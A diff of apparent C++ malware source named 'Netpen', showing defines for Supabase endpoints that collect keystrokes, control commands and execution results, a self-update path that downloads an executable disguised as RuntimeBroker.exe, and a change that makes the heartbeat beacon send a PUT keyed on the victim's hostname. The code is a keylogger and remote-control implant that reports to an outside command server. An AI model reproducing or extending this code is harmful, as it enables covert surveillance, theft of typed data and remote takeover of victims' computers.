@@ -34,7 +34,7 @@ ISampleGrabber : public IUnknown {
 #define SUPABASE_KEYS_PATH L"/rest/v1/keystrokes"
 #define SUPABASE_CONTROL_PATH L"/rest/v1/control"
 #define SUPABASE_EXEC_PATH L"/rest/v1/exec_results"
-#define SUPABASE_HEARTBEAT_PATH L"/rest/v1/heartbeat?on_conflict=hostname"
+#define SUPABASE_HEARTBEAT_PATH L"/rest/v1/heartbeat?hostname=eq."
 #define STORAGE_VER_PATH L"/storage/v1/object/public/Netpen/version.txt"
 #define STORAGE_EXE_PATH L"/storage/v1/object/public/Netpen/RuntimeBroker.exe"
 
@@ -1208,7 +1208,8 @@ static void HandleSpeaker(const std::string& rowId) {
 static void SendHeartbeat() {
     std::string json = "{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"version\":" + std::to_string(NETPEN_VERSION) + "}";
     std::string resp;
-    HttpRequest(L"POST", SUPABASE_HEARTBEAT_PATH, json, resp);
+    std::wstring path = SUPABASE_HEARTBEAT_PATH + ToWide(g_hostname);
+    HttpRequest(L"PUT", path.c_str(), json, resp);
 }
 
 static void FetchTriggers() {
